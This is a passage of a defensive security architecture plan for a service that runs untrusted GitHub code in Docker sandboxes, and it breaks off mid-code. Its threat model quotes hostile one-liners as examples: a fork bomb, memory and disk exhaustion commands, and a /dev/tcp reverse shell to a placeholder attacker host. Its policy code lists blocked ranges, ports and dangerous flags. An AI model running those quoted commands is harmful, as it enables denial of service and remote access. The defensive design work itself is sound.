# Repo2Web Phase 1A Security Architecture

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Establish the complete Phase 1A Security Architecture for Repo2Web — a system that executes untrusted GitHub repository code in isolated Docker containers. This document defines the threat model, security requirements, sandbox specifications, and code interfaces needed before arbitrary code execution is enabled.

**Architecture:** Security-first design where every repository is treated as hostile. Defense-in-depth through container isolation, network segmentation, resource limits, input validation, and secret management. Phase 0 Docker provides NOT production-grade sandboxing — this document explicitly documents what IS and IS NOT protected.

**Tech Stack:** Python 3.11+, FastAPI, Docker, PostgreSQL, Redis, Celery, Pydantic, structlog

---

## Global Constraints

- No new dependencies beyond what exists in Phase 0
- No production deployment or public URL exposure
- No AI/LLM-based security controls
- All security controls must be verifiable in code review
- Docker isolation is explicitly NOT production-grade — document limitations
- Never inject secrets into build/runtime containers
- Never rely on LLM to enforce security controls

---

## Section 1: Threat Model

### 1.1 Malicious Repository

**Attack Surface:** Any public GitHub repository can be submitted for execution.

| Threat | Vector | Likelihood | Impact | Mitigation |
|--------|--------|------------|--------|------------|
| Fork bomb | `:(){ :|:& };:` in build script | HIGH | HIGH | PID limit (100), cgroup isolation |
| Infinite process creation | `while true; do sleep 1 & done` | HIGH | HIGH | PID limit, CPU limit, timeout |
| CPU exhaustion | Crypto miner, busy loop | HIGH | HIGH | CPU quota (2 cores max), timeout |
| Memory exhaustion | `python -c "x=[]; [x.append(' '*1024) for _ in iter(int,1)]"` | HIGH | HIGH | Memory limit (1GB), memswap_limit=mem_limit |
| Disk exhaustion | `dd if=/dev/zero of=/tmp/fill bs=1M count=1024` | HIGH | HIGH | tmpfs size limits, storage_opt=1G |
| Filesystem traversal | `cat /etc/passwd`, symlink attacks | MEDIUM | MEDIUM | Non-root user, read-only rootfs, no host mounts |
| Malicious shell scripts | `.sh` files with reverse shells | HIGH | HIGH | Git hooks disabled, no host access |
| Crypto mining | XMRig in build/runtime | HIGH | MEDIUM | CPU limits, network restrictions, timeout |
| Reverse shells | `bash -i >& /dev/tcp/attacker/4444 0>&1` | MEDIUM | HIGH | Outbound port restrictions (no 4444), network isolation |
| Persistence attempts | Cron jobs, systemd services | LOW | HIGH | Non-root, no host mount, PID namespace isolated |
| Privilege escalation | `sudo`, `su`, `chmod +s` | MEDIUM | MEDIUM | No sudo in image, no-new-privileges, non-root user |
| Container escape | Kernel exploit, Docker misconfig | LOW | CRITICAL | Docker hardening (Phase 0 NOT production-grade) |

**Residual Risk:** Container escape via kernel vulnerability. Phase 0 Docker does NOT protect against CVE-class kernel exploits. Accepted with mitigations: dedicated host, automated kernel patching, planned gVisor/Kata migration.

### 1.2 Secret Theft

**What MUST be visible inside sandbox:**
- Build env: `PORT`, `BUILD_ID`, `REPO_URL`, `NODE_ENV`, `PYTHONUNBUFFERED`
- Runtime env: `PORT`, `RUNTIME_ID`

**What MUST NOT be visible inside sandbox:**
- `DATABASE_URL` — PostgreSQL connection string
- `REDIS_URL` — Redis connection string
- `JWT_SECRET` — JWT signing key
- `SECRET_KEY` — Application secret
- `GITHUB_TOKEN` — GitHub API token
- Any `*_PASSWORD`, `*_SECRET`, `*_TOKEN`, `*_KEY` pattern
- Host filesystem paths
- Docker socket
- Host SSH keys
- Cloud credentials (AWS, GCP, Azure)

| Secret | Storage | Injection | Exposed to Containers |
|--------|---------|-----------|----------------------|
| DATABASE_URL | Env var / Docker secret | Docker secret mount | **NO** |
| REDIS_URL | Env var / Docker secret | Docker secret mount | **NO** |
| JWT_SECRET | Env var / Docker secret | Docker secret mount | **NO** |
| GITHUB_TOKEN | Env var / Docker secret | Docker secret mount | **NO** |
| SECRET_KEY | Env var / Docker secret | Docker secret mount | **NO** |
| Build env vars | Hardcoded in service | Docker env | YES (minimal) |
| Runtime env vars | Configured per app | Docker env | YES (minimal) |

**Attack vectors:**
- Build script reads `/proc/self/environ` to access secrets → Mitigated: no secrets injected
- Runtime code reads Docker socket to access other containers → Mitigated: no Docker socket mount
- Side-channel via DNS exfiltration → Mitigated: DNS restricted to public resolvers only
- `postinstall` script exfiltrates `node_modules` → Mitigated: no secrets in node_modules

### 1.3 SSRF

**Attack vectors and mitigations:**

| Vector | Risk | Mitigation |
|--------|------|------------|
| `localhost` / `127.0.0.1` | HIGH | Blocked in URL validation, outbound iptables rules |
| `0.0.0.0` / `::1` | HIGH | Blocked in URL validation, outbound iptables rules |
| RFC1918 ranges (`10.x`, `172.16-31.x`, `192.168.x`) | HIGH | Blocked in URL validation, outbound iptables rules |
| Link-local (`169.254.x.x`) | HIGH | Blocked — cloud metadata endpoint |
| Cloud metadata (`169.254.169.254`) | CRITICAL | Blocked in URL validation, outbound iptables rules |
| Docker daemon (`unix:///var/run/docker.sock`) | CRITICAL | No Docker socket mount |
| Internal services (PostgreSQL, Redis, FastAPI) | HIGH | Separate Docker network, no route from build/runtime networks |
| Host network | HIGH | bridge network mode, not host |
| DNS rebinding | MEDIUM | Public DNS only (8.8.8.8, 1.1.1.1), no search domains |
| IPv6 bypass | MEDIUM | IPv6 ULA blocked (`fc00::/7`), `::1/128` blocked |
| Redirect bypass | MEDIUM | Max 3 redirects, verify final URL still on `github.com` |
| Alternate IP representations | LOW | `socket.getaddrinfo` resolves all IPs, checked against blocklist |

**Blocked IP ranges:**
```python
BLOCKED_IP_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),  # Cloud metadata
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fc00::/7"),  # IPv6 ULA
]
```

### 1.4 Container Escape

**Attack vectors:**

| Vector | Risk | Docker Protection | Phase 0 Status |
|--------|------|------------------|----------------|
| Privileged container | CRITICAL | We don't use `--privileged` | **PROTECTED** |
| Docker socket exposure | CRITICAL | We don't mount `/var/run/docker.sock` | **PROTECTED** |
| Host mounts | CRITICAL | We don't mount host volumes | **PROTECTED** |
| Dangerous capabilities | HIGH | `--cap-drop=ALL`, no cap_add | **PROTECTED** |
| Seccomp bypass | HIGH | Default Docker seccomp profile | **PARTIAL** |
| AppArmor/SELinux | MEDIUM | Docker default profiles | **PARTIAL** |
| Namespace escape | HIGH | PID/NET/MNT/UTS/USER/IPC namespaces | **PROTECTED** |
| Device access | HIGH | No `/dev` mounts, no `--device` | **PROTECTED** |
| `/proc` abuse | MEDIUM | Read-only where possible | **PARTIAL** |
| `/sys` access | HIGH | Not mounted | **PROTECTED** |
| Cgroup escape | HIGH | cgroups v2 with limits | **PARTIAL** |
| Kernel exploit | CRITICAL | NONE — shared kernel | **NOT PROTECTED** |

**Forbidden Docker configuration:**
- `--privileged` flag
- `--pid=host`
- `--network=host`
- `--ipc=host`
- `--uts=host`
- `--userns=host`
- `-v /var/run/docker.sock:/var/run/docker.sock`
- `-v /:/host` or any host mount
- `--device` flag
- `--cap-add` (any capability)
- `--security-opt seccomp=unconfined`
- `--security-opt apparmor=unconfined`

### 1.5 Supply Chain

| Vector | Risk | Mitigation |
|--------|------|------------|
| Malicious npm/PyPI package | HIGH | Lock files, registry allowlist, no private repos |
| Dependency confusion | HIGH | Block private registries, validate package names |
| Typosquatting | MEDIUM | No automated mitigation — requires manual review |
| Install hooks (`postinstall`, `setup.py`) | HIGH | Run in sandbox with resource limits, no host access |
| Compromised dependencies | MEDIUM | Lock files pin versions, future: dependency scanning |
| Mutable dependencies | HIGH | Lock files required, validate lock file hash |
| Malicious Docker base images | HIGH | Use official images only, pin versions |
| Malicious Dockerfiles in repo | HIGH | We generate Dockerfiles, ignore repo Dockerfiles |
| Malicious Makefiles | HIGH | Build commands are pre-defined, not user-supplied |
| Malicious shell scripts | HIGH | Git hooks disabled, scripts not auto-executed |

**Registry policy:**
```python
ALLOWED_REGISTRIES = [
    "https://pypi.org",
    "https://registry.npmjs.org",
    "https://github.com",
]

BLOCKED_REGISTRY_PATTERNS = [
    re.compile(r'https?://(?!pypi\.org|registry\.npmjs\.org|github\.com)[a-z0-9.-]+'),
    re.compile(r'https?://[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'),  # IP addresses
    re.compile(r'https?://localhost'),
    re.compile(r'https?://127\.'),
    re.compile(r'https?://10\.'),
    re.compile(r'https?://172\.(1[6-9]|2[0-9]|3[01])\.'),
    re.compile(r'https?://192\.168\.'),
]
```

### 1.6 GitHub Ingestion

| Vector | Risk | Mitigation |
|--------|------|------------|
| Arbitrary Git URLs | HIGH | URL pattern validation: `^https://github\.com/...` |
| Private repos | MEDIUM | Only public repos, no auth token injection |
| Redirects | MEDIUM | Max 3 redirects, verify final URL on `github.com` |
| Git protocol abuse | LOW | HTTPS only, git hooks disabled |
| Enormous repos | MEDIUM | Shallow clone (`--depth 1`), size limits |
| Git LFS | LOW | Block or download (configurable) |
| Recursive submodules | HIGH | `--no-checkout`, `.gitmodules` deleted after clone |
| Malicious filenames | MEDIUM | Validate paths, no traversal, no absolute paths |
| Symlinks | HIGH | Detect and block or sandbox symlinks |
| Enormous files | MEDIUM | Max file size check during analysis |
| Repository bombs | MEDIUM | Repo size limit (50MB), clone timeout (120s) |

**Safe clone command:**
```python
SAFE_CLONE_COMMAND = [
    "git", "clone",
    "--no-local", "--no-hardlinks", "--no-checkout",
    "--depth", "1",
    "--config", "core.hooksPath=/dev/null",
    "--config", "core.fsmonitor=false",
    "--config", "core.untrackedCache=false",
    "--config", "core.packedGitLimit=512m",
    "--config", "core.packedGitWindowSize=32m",
    "--branch", branch,
    url, dest,
]
```

---

## Section 2: Trust Boundary Diagram

```
                    TRUST BOUNDARY DIAGRAM
                    ======================

    ┌─────────────────────────────────────────────────────────────┐
    │                        INTERNET                             │
    │                    (UNTRUSTED)                              │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │                    TRUST BOUNDARY 1                         │
    │              Internet → Load Balancer                       │
    │                    (UNTRUSTED → SEMI-TRUSTED)               │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │                     FRONTEND                                │
    │                   Next.js (TRUSTED)                         │
    │                   Port 3000                                 │
    │                                                             │
    │  • User authentication                                      │
    │  • Input validation                                         │
    │  • Session management                                       │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │                    TRUST BOUNDARY 2                         │
    │              Frontend → API Gateway                         │
    │                    (TRUSTED → TRUSTED)                      │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │                   CONTROL PLANE                             │
    │               FastAPI + Celery (TRUSTED)                    │
    │               Port 8000                                     │
    │                                                             │
    │  • API endpoints                                            │
    │  • Authentication/Authorization                             │
    │  • Repository validation                                    │
    │  • Build orchestration                                      │
    │  • Runtime management                                       │
    │                                                             │
    │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
    │  │  PostgreSQL   │  │    Redis     │  │   Celery     │     │
    │  │  (RESTRICTED) │  │  (INTERNAL)  │  │  (TRUSTED)   │     │
    │  │  Port 5432    │  │  Port 6379   │  │              │     │
    │  └──────────────┘  └──────────────┘  └──────────────┘     │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │                    TRUST BOUNDARY 3                         │
    │         Control Plane → Build Sandbox                       │
    │              (TRUSTED → UNTRUSTED)                          │
    │                                                             │
    │  ⚠️  CRITICAL BOUNDARY: Untrusted code execution begins    │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │               UNTRUSTED BUILD SANDBOX                       │
    │              Docker Container (UNTRUSTED)                   │
    │                                                             │
    │  • Repository code executes here                            │
    │  • Network: repo2web-isolated (172.21.0.0/16)              │
    │  • Resources: 2 CPU, 1GB RAM, 1GB disk, 100 PIDs          │
    │  • User: 1000:1000 (non-root)                               │
    │  • Outbound: HTTP/HTTPS only (80, 443)                     │
    │  • DNS: 8.8.8.8, 1.1.1.1 only                              │
    │  • No access to: control plane, other sandboxes, host       │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │                    TRUST BOUNDARY 4                         │
    │         Build Sandbox → Artifact                            │
    │              (UNTRUSTED → SEMI-TRUSTED)                     │
    │                                                             │
    │  Build output (Docker image, static files) extracted        │
    │  Only built artifacts pass through — no build tools         │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │               UNTRUSTED RUNTIME SANDBOX                     │
    │              Docker Container (UNTRUSTED)                   │
    │                                                             │
    │  • Built application serves here                            │
    │  • Network: repo2web-runtimes (172.22.0.0/16)              │
    │  • Resources: 1 CPU, 512MB RAM, 512MB disk, 50 PIDs       │
    │  • User: 1000:1000 (non-root)                               │
    │  • Outbound: HTTP/HTTPS only (80, 443)                     │
    │  • Read-only root filesystem                                │
    │  • No package installation, no compilers                    │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │                    TRUST BOUNDARY 5                         │
    │         Runtime Sandbox → Public Proxy                      │
    │              (UNTRUSTED → SEMI-TRUSTED)                     │
    │                                                             │
    │  Reverse proxy (nginx/Caddy) routes traffic                 │
    │  TLS termination, rate limiting, request validation         │
    └──────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
    ┌─────────────────────────────────────────────────────────────┐
    │                    PUBLIC PROXY                             │
    │              Reverse Proxy (SEMI-TRUSTED)                   │
    │                                                             │
    │  • TLS termination                                          │
    │  • Rate limiting                                            │
    │  • Request size limits                                      │
    │  • WebSocket upgrade validation                             │
    │  • Tenant isolation via hostname routing                    │
    └─────────────────────────────────────────────────────────────┘
```

---

## Section 3: Security Requirements

### P0: Must Exist Before Arbitrary Code Execution

| ID | Requirement | Description | Verification |
|----|-------------|-------------|--------------|
| SEC-P0-01 | Container Resource Limits | CPU (2 cores), Memory (1GB), PIDs (100), Disk (1GB) enforced on ALL containers | `docker inspect` validates limits |
| SEC-P0-02 | Non-Root Execution | Containers run as user 1000:1000, never root | `docker exec whoami` returns non-root |
| SEC-P0-03 | Capability Dropping | `--cap-drop=ALL`, no `--cap-add` | Docker run args validation |
| SEC-P0-04 | No Privileged Containers | No `--privileged` flag anywhere | Config validation |
| SEC-P0-05 | No Host Mounts | No `-v /host:/container` mounts | Config validation |
| SEC-P0-06 | No Docker Socket | No `/var/run/docker.sock` mount | Config validation |
| SEC-P0-07 | Network Isolation | Build containers on `repo2web-isolated`, runtimes on `repo2web-runtimes`, internal on `repo2web-internal` | Docker network inspection |
| SEC-P0-08 | Outbound Restrictions | Only ports 80, 443 allowed outbound from sandboxes | iptables rules verification |
| SEC-P0-09 | SSRF Protection | All private IPs blocked in URL validation and outbound rules | Unit tests + iptables |
| SEC-P0-10 | Secret Isolation | No application secrets in build/runtime containers | Env var validation |
| SEC-P0-11 | Git Hook Disabled | `core.hooksPath=/dev/null` on clone | Clone command validation |
| SEC-P0-12 | Submodule Prevention | `.gitmodules` deleted after clone | Post-clone cleanup |
| SEC-P0-13 | URL Validation | GitHub URL pattern + IP resolution check | Unit tests |
| SEC-P0-14 | Build Timeout | Maximum 300s build time, enforced by Celery | Task configuration |
| SEC-P0-15 | Runtime Timeout | Maximum 24h runtime TTL, enforced by scheduler | Runtime cleanup task |
| SEC-P0-16 | DNS Restriction | Public DNS only (8.8.8.8, 1.1.1.1), no search domains | Docker daemon config |
| SEC-P0-17 | Read-Only Rootfs | Runtime containers use read-only root filesystem | Docker run args |
| SEC-P0-18 | No-New-Privileges | `--security-opt=no-new-privileges:true` on all containers | Config validation |
| SEC-P0-19 | Seccomp Profile | Default Docker seccomp profile applied | Config validation |
| SEC-P0-20 | Input Validation | All API input validated via Pydantic models | Test coverage |

### P1: Required Before Public Beta

| ID | Requirement | Description |
|----|-------------|-------------|
| SEC-P1-01 | Authentication | JWT-based authentication required for all API endpoints |
| SEC-P1-02 | Authorization | Resource ownership checks on all data access |
| SEC-P1-03 | Rate Limiting | Per-IP rate limits: 100/min analysis, 10/min deployment |
| SEC-P1-04 | Security Headers | CSP, HSTS, X-Frame-Options, etc. on all responses |
| SEC-P1-05 | Error Handling | No stack traces or internals in production error responses |
| SEC-P1-06 | Log Sanitization | Secrets redacted from build logs before storage |
| SEC-P1-07 | CORS Restriction | Only frontend origin allowed in production |
| SEC-P1-08 | Request Size Limits | 1MB max request body |
| SEC-P1-09 | Dependency Scanning | npm audit / pip-audit integration in build pipeline |
| SEC-P1-10 | Build Log Redaction | Secret patterns detected and redacted in build output |
| SEC-P1-11 | Deployment Expiration | Automatic cleanup after TTL |
| SEC-P1-12 | User Quotas | Per-user limits on concurrent builds/runtimes |
| SEC-P1-13 | Security Audit Logging | All security events logged with structured data |

### P2: Production Hardening

| ID | Requirement | Description |
|----|-------------|-------------|
| SEC-P2-01 | gVisor/Kata Containers | Migrate from Docker to hardware-level sandboxing |
| SEC-P2-02 | Network Policies | Calico/Cilium for fine-grained network control |
| SEC-P2-03 | Container Image Signing | Verify base image integrity |
| SEC-P2-04 | mTLS | Mutual TLS between all internal services |
| SEC-P2-05 | Secret Rotation | Automatic credential rotation |
| SEC-P2-06 | Runtime Monitoring | Container escape detection, anomaly detection |
| SEC-P2-07 | Penetration Testing | Regular third-party security assessments |
| SEC-P2-08 | SOC 2 Compliance | Audit controls for enterprise customers |

---

## Section 4: Sandbox Specification

```python
# apps/api/app/security/sandbox.py
"""
Sandbox configuration for build and runtime containers.

Every field has a secure default. Override only with explicit, validated values.
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class ContainerType(Enum):
    BUILD = "build"
    RUNTIME = "runtime"


class NetworkMode(Enum):
    ISOLATED = "repo2web-isolated"
    RUNTIMES = "repo2web-runtimes"
    INTERNAL = "repo2web-internal"


@dataclass(frozen=True)
class SandboxConfig:
    """
    Immutable sandbox configuration. Once created, cannot be modified.
    Use factory methods for common configurations.
    """

    # --- Resource Limits (cgroups v2) ---
    cpu_limit: float = 1.0                    # CPU cores
    memory_limit: str = "512m"                 # Memory limit
    memory_swap_limit: str = "512m"            # Swap limit (= memory = hard limit)
    disk_limit: str = "512m"                   # Container filesystem size
    pids_limit: int = 50                       # Maximum processes

    # --- Timeouts ---
    execution_timeout: int = 300               # Build step timeout (seconds)
    runtime_timeout: int = 86400               # Runtime TTL (seconds, 24h)

    # --- User Isolation ---
    user: str = "1000:1000"                    # Non-root user
    no_new_privileges: bool = True             # Prevent privilege escalation

    # --- Filesystem ---
    read_only_rootfs: bool = False             # True for runtimes, False for builds
    tmpfs: dict = field(default_factory=lambda: {
        "/tmp": "size=256m,noexec,nosuid",
        "/var/tmp": "size=128m,noexec,nosuid",
    })

    # --- Capabilities ---
    cap_drop: list = field(default_factory=lambda: ["ALL"])
    cap_add: list = field(default_factory=list)

    # --- Seccomp ---
    seccomp_profile: str = "default"           # Docker default profile

    # --- Network ---
    network_mode: NetworkMode = NetworkMode.ISOLATED
    dns_servers: list = field(default_factory=lambda: ["8.8.8.8", "1.1.1.1"])
    dns_search: list = field(default_factory=list)
    allowed_outbound_ports: list = field(default_factory=lambda: [80, 443])

    # --- Security Options ---
    security_opt: list = field(default_factory=lambda: ["no-new-privileges:true"])

    # --- Volumes (MUST be empty — no host mounts) ---
    volumes: list = field(default_factory=list)

    @classmethod
    def for_build(cls) -> "SandboxConfig":
        """Build sandbox: needs dependency installation, compilation."""
        return cls(
            cpu_limit=2.0,
            memory_limit="1g",
            memory_swap_limit="1g",
            disk_limit="1g",
            pids_limit=100,
            execution_timeout=300,
            read_only_rootfs=False,
            tmpfs={
                "/tmp": "size=512m,noexec,nosuid",
                "/var/tmp": "size=256m,noexec,nosuid",
                "/home/app": "size=256m",
            },
            network_mode=NetworkMode.ISOLATED,
        )

    @classmethod
    def for_runtime(cls) -> "SandboxConfig":
        """Runtime sandbox: serves built application, more restrictive."""
        return cls(
            cpu_limit=1.0,
            memory_limit="512m",
            memory_swap_limit="512m",
            disk_limit="512m",
            pids_limit=50,
            execution_timeout=86400,
            read_only_rootfs=True,
            tmpfs={
                "/tmp": "size=128m,noexec,nosuid",
                "/var/cache": "size=128m",
            },
            network_mode=NetworkMode.RUNTIMES,
        )

    def to_docker_run_args(
        self,
        image: str,
        command: list[str],
        env_vars: dict[str, str],
        name: str,
    ) -> dict:
        """Generate Docker API arguments for container creation."""
        return {
            "image": image,
            "command": command,
            "name": name,
            "detach": True,
            "user": self.user,

            # Resource limits
            "nano_cpus": int(self.cpu_limit * 1_000_000_000),
            "mem_limit": self.memory_limit,
            "memswap_limit": self.memory_swap_limit,
            "pids_limit": self.pids_limit,

            # Security
            "cap_drop": self.cap_drop,
            "security_opt": self.security_opt,

            # Network
            "network_mode": self.network_mode.value,
            "dns": self.dns_servers,
            "dns_search": self.dns_search,

            # Filesystem
            "read_only": self.read_only_rootfs,
            "tmpfs": self.tmpfs,
            "storage_opt": {"size": self.disk_limit} if self.disk_limit else None,

            # Environment
            "environment": env_vars,

            # No host volumes
            "volumes": self.volumes,
        }

    def validate(self) -> list[str]:
        """Validate configuration for security compliance. Returns list of violations."""
        violations = []

        if self.user == "root" or self.user.startswith("0:"):
            violations.append("Container must not run as root")

        if "ALL" not in self.cap_drop:
            violations.append("Must drop ALL capabilities")

        if self.cap_add:
            violations.append("Must not add capabilities")

        if not self.no_new_privileges:
            violations.append("Must enable no-new-privileges")

        if self.volumes:
            violations.append("Must not mount host volumes")

        if self.network_mode == NetworkMode.INTERNAL:
            violations.append("Untrusted code must not use internal network")

        if len(self.dns_servers) == 0:
            violations.append("Must configure DNS servers")

        for dns in self.dns_servers:
            if dns not in ("8.8.8.8", "1.1.1.1", "8.8.4.4"):
                violations.append(f"DNS server {dns} not in allowlist")

        return violations
```

---

## Section 5: Network Policy

```python
# apps/api/app/security/network_policy.py
"""
Machine-readable network policy for build and runtime containers.

All policies are deny-by-default. Only explicitly allowed traffic is permitted.
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Optional


class Protocol(Enum):
    TCP = "tcp"
    UDP = "udp"
    ICMP = "icmp"


class Direction(Enum):
    INGRESS = "ingress"
    EGRESS = "egress"


@dataclass(frozen=True)
class NetworkRule:
    """Single network rule — immutable."""
    direction: Direction
    protocol: Protocol
    port: Optional[int] = None          # None = all ports
    source_cidr: Optional[str] = None   # For ingress
    dest_cidr: Optional[str] = None     # For egress
    action: str = "allow"               # "allow" or "deny"
    description: str = ""


@dataclass(frozen=True)
class NetworkPolicy:
    """
    Complete network policy for a container type.
    deny-by-default: all traffic blocked unless explicitly allowed.
    """
    name: str
    rules: list[NetworkRule] = field(default_factory=list)

    # --- Egress Defaults ---
    ALLOWED_EGRESS_PORTS: tuple = (80, 443)

    # --- Blocked CIDRs (RFC1918 + link-local + loopback) ---
    BLOCKED_CIDRS: tuple = (
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "169.254.0.0/16",    # Cloud metadata
        "127.0.0.0/8",
        "fc00::/7",          # IPv6 ULA
        "::1/128",           # IPv6 loopback
    )

    # --- Blocked Hosts ---
    BLOCKED_HOSTS: tuple = (
        "localhost",
        "127.0.0.1",
        "0.0.0.0",
        "metadata.google.internal",
        "169.254.169.254",   # AWS/GCP/Azure metadata
    )

    # --- DNS Policy ---
    ALLOWED_DNS: tuple = ("8.8.8.8", "1.1.1.1", "8.8.4.4")
    DNS_PORT: int = 53

    # --- Connection Limits ---
    connection_timeout: int = 30         # Seconds
    max_connections: int = 100           # Per container
    max_outbound_bandwidth: str = "100m" # Mbps

    # --- Blocked Ports (outbound) ---
    BLOCKED_PORTS: tuple = (
        22,     # SSH
        23,     # Telnet
        25,     # SMTP
        587,    # SMTP submission
        465,    # SMTPS
        3389,   # RDP
        4444,   # Metasploit default
        5555,   # Common reverse shell
        6660,   # IRC (botnet C&C)
        6667,   # IRC
    )


# --- Pre-defined policies ---

BUILD_NETWORK_POLICY = NetworkPolicy(
    name="build-isolation",
    rules=[
        # Egress: HTTP/HTTPS only
        NetworkRule(
            direction=Direction.EGRESS,
            protocol=Protocol.TCP,
            port=80,
            description="HTTP for package downloads",
        ),
        NetworkRule(
            direction=Direction.EGRESS,
            protocol=Protocol.TCP,
            port=443,
            description="HTTPS for package downloads",
        ),
        # Egress: DNS
        NetworkRule(
            direction=Direction.EGRESS,
            protocol=Protocol.UDP,
            port=53,
            description="DNS resolution",
        ),
        # Deny all ingress (default)
        NetworkRule(
            direction=Direction.INGRESS,
            protocol=Protocol.TCP,
            action="deny",
            description="Default deny ingress",
        ),
    ],
)

RUNTIME_NETWORK_POLICY = NetworkPolicy(
    name="runtime-isolation",
    rules=[
        # Egress: HTTP/HTTPS only
        NetworkRule(
            direction=Direction.EGRESS,
            protocol=Protocol.TCP,
            port=80,
            description="HTTP for external APIs",
        ),
        NetworkRule(
            direction=Direction.EGRESS,
            protocol=Protocol.TCP,
            port=443,
            description="HTTPS for external APIs",
        ),
        # Egress: DNS
        NetworkRule(
            direction=Direction.EGRESS,
            protocol=Protocol.UDP,
            port=53,
            description="DNS resolution",
        ),
        # Deny all ingress (default — traffic routed through proxy)
        NetworkRule(
            direction=Direction.INGRESS,
            protocol=Protocol.TCP,
            action="deny",
            description="Default deny ingress",
        ),
    ],
)


def generate_iptables_rules(
    policy: NetworkPolicy,
    source_cidr: str,
) -> list[list[str]]:
    """Generate iptables rules from a network policy."""
    rules = []

    # Default: drop all forwarded traffic from this source
    rules.append([
        "iptables", "-A", "FORWARD",
        "-s", source_cidr,
        "-j", "DROP",
    ])

    # Allow specific egress
    for rule in policy.rules:
        if rule.direction == Direction.EGRESS and rule.action == "allow":
            args = [
                "iptables", "-I", "FORWARD",
                "-s", source_cidr,
                "-p", rule.protocol.value,
            ]
            if rule.port:
                args.extend(["--dport", str(rule.port)])
            if rule.dest_cidr:
                args.extend(["-d", rule.dest_cidr])
            args.extend(["-j", "ACCEPT"])
            rules.append(args)

    # Block specific CIDRs (defense-in-depth)
    for cidr in policy.BLOCKED_CIDRS:
        rules.append([
            "iptables", "-A", "FORWARD",
            "-s", source_cidr,
            "-d", cidr,
            "-j", "DROP",
        ])

    # Block specific ports
    for port in policy.BLOCKED_PORTS:
        rules.append([
            "iptables", "-A", "FORWARD",
            "-s", source_cidr,
            "-p", "tcp",
            "--dport", str(port),
            "-j", "DROP",
        ])

    return rules
```

---

## Section 6: Repository Policy

```python
# apps/api/app/security/repository_policy.py
"""
Repository ingestion policy — what we accept and how we process it.
"""

import re
from dataclasses import dataclass
from typing import Optional


@dataclass(frozen=True)
class RepositoryPolicy:
    """Immutable policy for repository ingestion."""

    # --- URL Validation ---
    allowed_url_pattern: str = r"^https://github\.com/[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+(/.*)?$"
    require_https: bool = True
    require_github: bool = True

    # --- Size Limits ---
    max_repository_size_mb: int = 50        # Maximum repo size (uncompressed)
    max_file_size_mb: int = 10              # Maximum individual file size
    max_total_files: int = 10_000           # Maximum number of files

    # --- Git Configuration ---
    shallow_clone: bool = True              # --depth 1
    clone_timeout_seconds: int = 120        # Maximum clone time
    disable_hooks: bool = True              # core.hooksPath=/dev/null
    disable_fsmonitor: bool = True          # core.fsmonitor=false
    disable_untracked_cache: bool = True    # core.untrackedCache=false

    # --- Submodule Policy ---
    allow_submodules: bool = False          # Block recursive submodules
    delete_gitmodules: bool = True          # Remove .gitmodules after clone

    # --- Symlink Policy ---
    allow_symlinks: bool = False            # Block symlinks entirely
    # If True: sandbox symlinks, never follow outside repo root

    # --- Git LFS Policy ---
    allow_lfs: bool = False                 # Block Git LFS by default
    # If True: download LFS objects during clone

    # --- Branch/Commit Policy ---
    require_immutable_commit: bool = True   # Deploy by SHA, never branch
    allowed_branches: Optional[list] = None # None = any branch allowed
    validate_commit_sha: bool = True        # Verify SHA format (40-char hex)

    # --- File Type Restrictions ---
    blocked_extensions: tuple = (
        ".exe", ".dll", ".so", ".dylib",    # Binaries
        ".bin", ".dat",                      # Data files
    )

    # --- Content Validation ---
    scan_for_secrets: bool = True           # Scan repo for leaked secrets
    block_private_keys: bool = True         # Block repos with private keys
    block_dockerfiles: bool = True          # Ignore repo Dockerfiles (we generate ours)


# Default policy
DEFAULT_REPO_POLICY = RepositoryPolicy()


def validate_commit_sha(sha: str) -> bool:
    """Validate that a commit SHA is a valid 40-character hex string."""
    return bool(re.match(r"^[0-9a-f]{40}$", sha))


def validate_short_sha(sha: str) -> bool:
    """Validate that a short SHA is at least 7 characters of hex."""
    return bool(re.match(r"^[0-9a-f]{7,40}$", sha))
```

---

## Section 7: Build vs Runtime Security

### Build Sandbox Policy

```python
# apps/api/app/security/build_policy.py
"""
Build sandbox security policy.

Build containers need:
- Dependency installation (pip install, npm install)
- Compilation (gcc, go build, etc.)
- Process execution (build scripts)
- Network access (download packages)

Build containers MUST NOT have:
- Application secrets
- Host filesystem access
- Docker socket access
- Access to other containers
- Persistent state between builds
"""

from app.security.sandbox import SandboxConfig, ContainerType

BUILD_SECURITY_POLICY = {
    "container_type": ContainerType.BUILD,
    "sandbox": SandboxConfig.for_build(),

    # --- Allowed Commands ---
    "allowed_commands": {
        "python": ["python", "pip", "python3", "pip3"],
        "node": ["node", "npm", "npx", "yarn", "pnpm"],
        "ruby": ["ruby", "gem", "bundle"],
        "go": ["go"],
        "rust": ["cargo"],
        "java": ["javac", "java", "mvn", "gradle"],
